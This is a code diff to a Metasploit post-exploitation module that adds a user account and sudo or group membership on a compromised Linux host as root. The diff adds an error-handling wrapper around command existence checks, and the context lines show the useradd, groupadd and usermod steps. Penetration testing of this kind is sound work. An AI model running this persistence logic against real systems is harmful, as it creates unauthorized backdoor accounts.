@@ -48,6 +48,20 @@ class MetasploitModule < Msf::Post
     return group_data =~ /^#{Regexp.escape(group_name)}:/
   end
 
+  # Checks if the specified command can be executed by the session. It should be
+  # noted that not all commands correspond to a binary file on disk. For example,
+  # a bash shell session will provide the `eval` command when there is no `eval`
+  # binary on disk. Likewise, a Powershell session will provide the `Get-Item`
+  # command when there is no `Get-Item` executable on disk.
+  #
+  # @param [String] cmd the command to check
+  # @return [Boolean] true when the command exists
+  def check_command_exists?(cmd)
+    command_exists?(cmd)
+  rescue RuntimeError => e
+    fail_with(Failure::Unknown, "Unable to check if command `#{cmd}' exists: #{e}")
+  end
+
   def d_cmd_exec(command)
     vprint_status(command)
     print_line(cmd_exec(command))
@@ -57,12 +71,12 @@ class MetasploitModule < Msf::Post
     fail_with(Failure::NoAccess, 'Session isnt running as root') unless is_root?
     case datastore['UseraddMethod']
     when 'CUSTOM'
-      fail_with(Failure::NotFound, "Cannot find command on path given: #{datastore['UseraddBinary']}") unless command_exists?(datastore['UseraddBinary'])
+      fail_with(Failure::NotFound, "Cannot find command on path given: #{datastore['UseraddBinary']}") unless check_command_exists?(datastore['UseraddBinary'])
     when 'AUTO'
-      fail_with(Failure::NotVulnerable, 'Cannot find a means to add a new user') unless command_exists?('useradd') || command_exists?('adduser')
+      fail_with(Failure::NotVulnerable, 'Cannot find a means to add a new user') unless check_command_exists?('useradd') || check_command_exists?('adduser')
     end
     fail_with(Failure::NotVulnerable, 'Cannot add user to sudo as sudoers doesnt exist') unless datastore['SudoMethod'] != 'SUDO_FILE' || file_exist?('/etc/sudoers')
-    fail_with(Failure::NotFound, 'Shell specified does not exist on system') unless command_exists?(datastore['SHELL'])
+    fail_with(Failure::NotFound, 'Shell specified does not exist on system') unless check_command_exists?(datastore['SHELL'])
     fail_with(Failure::BadConfig, "Username [#{datastore['USERNAME']}] is not a legal unix username.") unless datastore['USERNAME'] =~ /^[a-z][a-z0-9_-]{0,31}$/
 
     # Encrypting password ahead of time
@@ -104,9 +118,9 @@ class MetasploitModule < Msf::Post
     # Check database to see what OS it is. If it meets specific requirements, This can all be done in a single line
     binary = case datastore['UseraddMethod']
              when 'AUTO'
-               if command_exists?('useradd')
+               if check_command_exists?('useradd')
                  'useradd'
-               elsif command_exists?('adduser')
+               elsif check_command_exists?('adduser')
                  'adduser'
                else
                  'MANUAL'
@@ -141,7 +155,7 @@ class MetasploitModule < Msf::Post
         # Since command can add on groups, checking over groups
         groupadd = ''
         if datastore['MissingGroups'] == 'CREATE'
-          groupadd = command_exists?('groupadd') ? 'groupadd' : 'addgroup'
+          groupadd = check_command_exists?('groupadd') ? 'groupadd' : 'addgroup'
 
           groups_missing.each do |group|
             d_cmd_exec("#{groupadd} #{group}")
@@ -176,7 +190,7 @@ class MetasploitModule < Msf::Post
         # Since command can add on groups, checking over groups
         groupadd = ''
         if datastore['MissingGroups'] == 'CREATE'
-          groupadd = command_exists?('groupadd') ? 'groupadd' : 'addgroup'
+          groupadd = check_command_exists?('groupadd') ? 'groupadd' : 'addgroup'
 
           groups_missing.each do |group|
             d_cmd_exec("#{groupadd} #{group}")
@@ -240,7 +254,7 @@ class MetasploitModule < Msf::Post
       # Since command can add on groups, checking over groups
       groupadd = ''
       if datastore['MissingGroups'] == 'CREATE'
-        groupadd = command_exists?('groupadd') ? 'groupadd' : 'addgroup'
+        groupadd = check_command_exists?('groupadd') ? 'groupadd' : 'addgroup'
 
         groups_missing.each do |group|
           d_cmd_exec("#{groupadd} #{group}")
@@ -249,9 +263,9 @@ class MetasploitModule < Msf::Post
       end
 
       # Attempt to do add groups to user by normal means, or do it manually
-      if command_exists?('usermod')
+      if check_command_exists?('usermod')
         d_cmd_exec("usermod -aG #{groups.join(',')} #{datastore['USERNAME']}")
-      elsif command_exists?('addgroup')
+      elsif check_command_exists?('addgroup')
         groups.each do |group|
           d_cmd_exec("addgroup #{datastore['USERNAME']} #{group}")
         end
